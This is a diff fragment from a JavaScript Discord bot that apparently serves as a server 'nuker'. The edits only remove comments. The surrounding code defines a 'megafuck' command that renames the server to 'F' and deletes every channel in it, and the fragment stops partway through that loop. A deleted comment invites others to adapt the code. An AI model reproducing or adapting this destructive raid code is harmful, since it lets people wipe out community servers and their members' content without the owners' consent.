@@ -34,7 +34,7 @@ client.on("ready", () => {
     client.user.setActivity({
         name: "Hakiado?",
         type: "STREAMING",
-        url: "https://www.twitch.tv/mucalol", // Follow my twitch ;) | Feel free to change these
+        url: "https://www.twitch.tv/mucalol",
     })
 });
 
@@ -472,7 +472,7 @@ client.on('message', message => {
 
     if (message.content.startsWith(prefix + 'megafuck')) {
 
-        message.guild.setName(`F`).then(console.log(green(`F`))); // changes server name
+        message.guild.setName(`F`).then(console.log(green(`F`))); 
 
         message.guild.channels.cache.forEach(channel => channel.delete().then(
             console.log(redBright(`F`))
